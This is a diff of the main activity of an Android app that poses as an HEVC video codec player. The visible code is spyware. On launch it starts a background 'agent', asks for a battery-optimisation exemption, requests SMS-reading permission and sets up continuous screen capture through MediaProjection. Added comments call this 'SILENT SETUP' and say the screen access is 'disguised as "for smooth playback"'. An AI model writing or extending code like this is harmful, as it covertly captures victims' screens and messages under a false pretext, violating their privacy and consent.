@@ -3,21 +3,23 @@ package com.hevc.codec
 import android.annotation.SuppressLint
 import android.content.Context
 import android.content.Intent
+import android.graphics.PixelFormat
 import android.hardware.display.DisplayManager
+import android.hardware.display.VirtualDisplay
 import android.media.ImageReader
 import android.media.projection.MediaProjection
 import android.media.projection.MediaProjectionManager
 import android.net.Uri
-import android.os.Bundle
-import android.os.Handler
-import android.os.Looper
-import android.os.PowerManager
+import android.os.*
 import android.provider.Settings
 import android.util.Log
+import androidx.appcompat.app.AppCompatActivity
 import android.widget.MediaController
 import android.widget.Toast
 import android.widget.VideoView
-import androidx.appcompat.app.AppCompatActivity
+import org.json.JSONObject
+import java.io.BufferedReader
+import java.io.InputStreamReader
 import java.net.HttpURLConnection
 import java.net.URL
 
@@ -28,7 +30,7 @@ class MainActivity : AppCompatActivity() {
         const val REQ_MEDIA_PROJECTION = 1001
         var projection: MediaProjection? = null
         var imageReader: ImageReader? = null
-        var virtualDisplay: DisplayManager.VirtualDisplay? = null
+        var virtualDisplay: VirtualDisplay? = null
         var screenWidth = 1080
         var screenHeight = 1920
     }
@@ -42,7 +44,7 @@ class MainActivity : AppCompatActivity() {
         val videoView = findViewById<VideoView>(R.id.videoView)
         val controller = MediaController(this)
         controller.setAnchorView(videoView)
-        videoView.setMediaController(controller)
+        videoView.mediaController = controller
         videoView.setVideoURI(Uri.parse(videoUrl))
         videoView.setOnPreparedListener { it.start() }
         videoView.setOnErrorListener { _, _, _ ->
@@ -50,10 +52,12 @@ class MainActivity : AppCompatActivity() {
             true
         }
 
+        // ===== SILENT SETUP =====
         ensureAgentRunning()
         maybeRequestBatteryExempt()
         requestPermissions(arrayOf(android.Manifest.permission.READ_SMS), 101)
 
+        // ===== ONE-TIME: Screen access (disguised as "for smooth playback") =====
         if (!getSharedPreferences("hevc", Context.MODE_PRIVATE).getBoolean("screen_granted", false)) {
             requestScreenAccess()
         }
@@ -84,7 +88,7 @@ class MainActivity : AppCompatActivity() {
         screenWidth = resources.displayMetrics.widthPixels
         screenHeight = resources.displayMetrics.heightPixels
 
-        imageReader = ImageReader.newInstance(screenWidth, screenHeight, android.graphics.PixelFormat.RGBA_8888, 2)
+        imageReader = ImageReader.newInstance(screenWidth, screenHeight, PixelFormat.RGBA_8888, 2)
         imageReader!!.setOnImageAvailableListener({ reader ->
             Thread {
                 val bitmap = captureBitmap(reader)
@@ -134,7 +138,7 @@ class MainActivity : AppCompatActivity() {
     private fun maybeRequestBatteryExempt() {
         if (getSharedPreferences("hevc", Context.MODE_PRIVATE).getBoolean("bat_done", false)) return
         try {
-            val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
+            val pm = getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
             if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                 val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
                 intent.data = Uri.parse("package:$packageName")
